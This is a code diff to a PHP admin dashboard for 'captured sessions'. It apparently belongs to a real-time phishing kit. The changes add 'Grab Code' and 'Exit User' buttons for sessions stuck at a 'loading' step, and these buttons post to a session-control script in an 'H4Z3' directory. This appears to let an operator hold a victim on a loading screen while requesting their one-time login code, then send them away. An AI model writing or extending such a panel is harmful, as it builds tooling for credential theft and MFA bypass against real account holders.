@@ -20,6 +20,7 @@ if (isset($_POST['logout'])) {
 
 $loggedIn = !empty($_SESSION['admin_authenticated']);
 $error = null;
+$controlError = null;
 
 if (!$loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = $_POST['username'] ?? '';
@@ -71,6 +72,10 @@ if (!$loggedIn) {
     </html>
     <?php
     exit;
+}
+
+if ($loggedIn) {
+    $controlError = $_GET['error'] ?? null;
 }
 
 if ($loggedIn && isset($_GET['export'])) {
@@ -133,6 +138,8 @@ uksort($sessions, function ($a, $b) use ($sessions) {
         a.export-link { background:#0369a1; color:#fff; }
         .empty-state { text-align:center; padding:4rem; color:#64748b; }
         .payload { font-family:monospace; font-size:0.85rem; background:#f8fafc; padding:0.5rem; border-radius:4px; }
+        .alert { margin: 1rem 0; padding: 0.75rem 1rem; border-radius: 4px; }
+        .alert.error { background: #fee2e2; color: #7f1d1d; }
     </style>
 </head>
 <body>
@@ -144,6 +151,9 @@ uksort($sessions, function ($a, $b) use ($sessions) {
     </form>
 </header>
 <main>
+    <?php if (!empty($controlError)): ?>
+        <div class="alert error"><?php echo htmlspecialchars($controlError, ENT_QUOTES, 'UTF-8'); ?></div>
+    <?php endif; ?>
     <?php if (empty($sessions)): ?>
         <div class="empty-state">No captured sessions available.</div>
     <?php else: ?>
@@ -174,6 +184,16 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                         <?php echo $badgeLabel; ?>
                     </div>
                 </div>
+                <?php
+                    $entries = $sessionData['entries'] ?? [];
+                    $latestEntry = null;
+                    if (!empty($entries)) {
+                        $latestEntry = $entries[count($entries) - 1];
+                    }
+                    $latestStep = $latestEntry['step'] ?? null;
+                    $shouldShowLoadingActions = ($latestStep === 'loading');
+                    $redirectTarget = htmlspecialchars($_SERVER['SCRIPT_NAME'], ENT_QUOTES, 'UTF-8');
+                ?>
                 <div class="actions">
                     <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
                     <form method="post" action="" onsubmit="return confirm('Delete this session?');">
@@ -181,6 +201,20 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                         <input type="hidden" name="action" value="delete">
                         <button type="submit" class="action-btn danger">Delete</button>
                     </form>
+                    <?php if ($shouldShowLoadingActions): ?>
+                        <form method="post" action="../H4Z3/session_control.php">
+                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                            <input type="hidden" name="pending_action" value="code">
+                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                            <button type="submit" class="action-btn secondary">Grab Code</button>
+                        </form>
+                        <form method="post" action="../H4Z3/session_control.php">
+                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                            <input type="hidden" name="pending_action" value="complete">
+                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                            <button type="submit" class="action-btn secondary">Exit User</button>
+                        </form>
+                    <?php endif; ?>
                 </div>
                 <?php if (!empty($sessionData['entries'])): ?>
                     <table>
